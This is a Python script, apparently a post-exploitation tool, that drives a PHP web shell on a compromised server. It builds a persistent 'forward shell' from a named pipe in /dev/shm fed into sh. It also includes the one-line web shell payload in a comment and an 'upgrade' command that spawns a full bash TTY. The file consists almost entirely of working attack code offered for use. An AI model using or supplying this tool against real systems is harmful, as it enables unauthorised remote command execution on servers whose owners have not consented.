#!/usr/bin/env python3

import random
import requests
import sys
from time import sleep

# Web shell format: <?php system($_REQUEST["cmd"]); ?>


class Term:
    def __init__(self, url):
        self.__prompt = "(Cmd) "
        self.__url = url
        self.__nrand = random.randrange(10000, 99999)
        self.__stdin = f"/dev/shm/in-{self.__nrand}"
        self.__stdout = f"/dev/shm/out-{self.__nrand}"
        self.__upgrade_shell = "script -qc /bin/bash /dev/null"

        r = requests.get(self.__url, params={'cmd': 'whoami'})
        assert "www-data" in r.text

        self.__webshell(f"mkfifo {self.__stdin}")
        self.__webshell(f"tail -f {self.__stdin} | sh 2>&1 > {self.__stdout}")

    def __webshell(self, c):
        try:
            r = requests.get(self.__url, params={'cmd': c}, timeout=0.1)
            return r.text
        except requests.exceptions.ReadTimeout:
            pass

    def __exe_cmd(self, command):
        self.__webshell(f"echo {command} > {self.__stdin}")
        sleep(0.3)
        res = self.__webshell(
            f"cat {self.__stdout}; echo -n > {self.__stdout}")
        return res

    def exe_command(self):
        while True:
            command = input(self.__prompt)
            if command == "upgrade":
                print(self.__exe_cmd(self.__upgrade_shell), end="")
                self.__exe_cmd("stty raw -echo")
                self.__prompt = ""
            else:
                print(self.__exe_cmd(command), end="")
                if command == "exit":
                    if "not a tty" in self.__exe_cmd("tty"):
                        self.__prompt = "(Cmd) "
                    elif "" in self.__exe_cmd("tty"):
                        sys.exit()


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} [URL-WEBSHELL]")
        sys.exit()

    url = sys.argv[1]
    term = Term(url)

    try:
        term.exe_command()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
